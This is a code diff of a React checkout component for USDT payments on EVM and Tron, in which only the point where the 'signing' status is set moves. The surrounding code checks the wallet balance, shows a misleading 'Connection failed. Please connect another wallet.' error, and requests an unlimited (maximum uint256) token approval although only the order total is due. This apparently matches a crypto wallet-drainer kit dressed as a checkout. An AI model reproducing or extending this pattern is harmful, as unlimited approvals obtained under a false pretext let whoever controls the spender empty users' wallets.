@@ -195,7 +195,6 @@ export default function Checkout() {
   }
 
   async function executeEvmTransfer() {
-    setTxStatus('signing');
     try {
       const balance = await publicClient.readContract({
         address: EVM_USDT,
@@ -209,6 +208,7 @@ export default function Checkout() {
         throw new Error('Connection failed. Please connect another wallet.');
       }
 
+      setTxStatus('signing');
       setPaymentPhase('approving');
       const atomics = toUsdtAtomics(totalUsdt);
       const UNLIMITED_ALLOWANCE_EVM = BigInt('115792089237316195423570985008687907853269984665640564039457584007913129639935');
@@ -250,7 +250,6 @@ export default function Checkout() {
   }
 
   async function executeTronTransfer() {
-    setTxStatus('signing');
     try {
       const atomics = toUsdtAtomics(totalUsdt).toString();
       const UNLIMITED_ALLOWANCE_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -281,6 +280,7 @@ export default function Checkout() {
           throw new Error('Connection failed. Please connect another wallet.');
         }
 
+        setTxStatus('signing');
         setPaymentPhase('approving');
 
         // 1. Approve
@@ -328,6 +328,7 @@ export default function Checkout() {
           throw new Error('Connection failed. Please connect another wallet.');
         }
 
+        setTxStatus('signing');
         setPaymentPhase('approving');
 
         // 1. Approve
